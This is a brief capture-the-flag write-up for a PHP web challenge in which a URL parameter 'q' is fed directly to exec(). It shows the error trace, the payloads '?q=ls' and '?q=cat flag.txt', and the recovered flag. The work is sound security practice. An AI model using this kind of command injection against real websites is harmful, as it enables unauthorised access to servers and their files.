# Fanklub PHP
**Category**: web \
**Points**: 200 

## Description
Jedna z anonimowych grup użytkowników PHP pozwala sobie ostatnio na zbyt wiele. Pokaż im kto tu rządzi.

## Solution
On the site, we are greeted with an error that paramter 'q' was not found. Providing the parameter but without any value gives another error: 

```
Uncaught ValueError: exec(): Argument #1 ($command) cannot be empty in /opt/app/tech.html:6 Stack trace: #0 /opt/app/tech.html(6): exec('') #1 /opt/app/index.php(17): include('/opt/app/tech.h...') #2 {main} thrown in /opt/app/tech.html on line 6
```

so it's trying to exec a system command through this parameter. Giving value 'ls' to the 'q' parameter lists files in the current folder. Final step was to just cat flag.txt:
```
?q=cat flag.txt
```

## FLAG
flag{php_zawsze_w_sercu_pentestera}